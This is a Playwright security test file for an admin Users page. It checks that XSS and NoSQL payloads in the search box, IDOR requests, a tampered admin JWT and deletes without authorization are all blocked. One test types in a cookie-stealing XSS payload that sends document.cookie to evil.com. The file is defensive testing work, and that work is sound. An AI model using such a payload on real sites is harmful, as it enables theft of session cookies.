import { test, expect } from "../../../fixtures/auth.fixture";
import { UsersPage } from "../../../pages/UsersPage";
import {
  callApiAs,
  expectForbidden,
  XSS_PAYLOADS,
  NOSQL_PAYLOADS,
} from "../../../helpers/security.helper";

export const usersSecurityTests = () => {
  test.describe("Admin — Users › Security", () => {
    test("XSS payloads in search input are escaped and not executed", async ({
      asAdmin: page,
    }) => {
      const usersPage = new UsersPage(page);
      await usersPage.goto();
      await page.waitForResponse(
        (r) =>
          r.url().includes("/api/admin/users") && r.request().method() === "GET",
        { timeout: 10000 },
      );

      for (const payload of XSS_PAYLOADS) {
        let alertFired = false;
        page.once("dialog", async (d) => {
          alertFired = true;
          await d.dismiss();
        });

        await usersPage.searchInput.fill(payload);
        await page.waitForTimeout(700);

        expect(alertFired).toBe(false);

        const bodyHtml = await page.locator("body").innerHTML();
        expect(bodyHtml).not.toContain("<script>alert(1)</script>");
      }

      await usersPage.searchInput.fill("");
    });

    test("NoSQL injection payloads in search do not cause 500 errors", async ({
      asAdmin: page,
    }) => {
      const usersPage = new UsersPage(page);
      await usersPage.goto();
      await page.waitForResponse(
        (r) =>
          r.url().includes("/api/admin/users") && r.request().method() === "GET",
        { timeout: 10000 },
      );

      for (const payload of NOSQL_PAYLOADS) {
        const responsePromise = page.waitForResponse(
          (r) =>
            r.url().includes("/api/admin/users") &&
            r.request().method() === "GET",
          { timeout: 5000 },
        );
        await usersPage.searchInput.fill(payload);
        const response = await responsePromise;
        expect(response.status()).not.toBe(500);
      }
    });

    test("IDOR: organizer cannot fetch another user's details via API", async () => {
      const res = await callApiAs("organizer", {
        method: "GET",
        url: "/api/admin/users/000000000000000000000001",
      });
      expectForbidden(res.status);
    });

    test("IDOR: organizer cannot navigate to /users/:id UI route", async ({
      asOrganizer: page,
    }) => {
      await page.goto("/users/000000000000000000000001");
      await expect(page).not.toHaveURL(
        /\/users\/000000000000000000000001/,
        { timeout: 8000 },
      );
    });

    test("delete requires valid admin JWT — tampered token is rejected", async () => {
      const res = await callApiAs(null, {
        method: "DELETE",
        url: "/api/admin/users/000000000000000000000001",
        headers: {
          Authorization:
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.tampered",
        },
      });
      expectForbidden(res.status);
    });

    test("CSRF: DELETE without Authorization header is rejected", async () => {
      const res = await callApiAs(null, {
        method: "DELETE",
        url: "/api/admin/users/000000000000000000000001",
      });
      expectForbidden(res.status);
    });

    test("search input does not leak other users' data in XSS payload", async ({
      asAdmin: page,
    }) => {
      const usersPage = new UsersPage(page);
      await usersPage.goto();
      await page.waitForResponse(
        (r) =>
          r.url().includes("/api/admin/users") && r.request().method() === "GET",
        { timeout: 10000 },
      );

      await usersPage.searchInput.fill(
        '"><img src=x onerror=this.src="//evil.com/?c="+document.cookie>',
      );
      await page.waitForTimeout(700);

      const imgs = page.locator('img[src*="evil.com"]');
      await expect(imgs).toHaveCount(0);
    });
  });
};
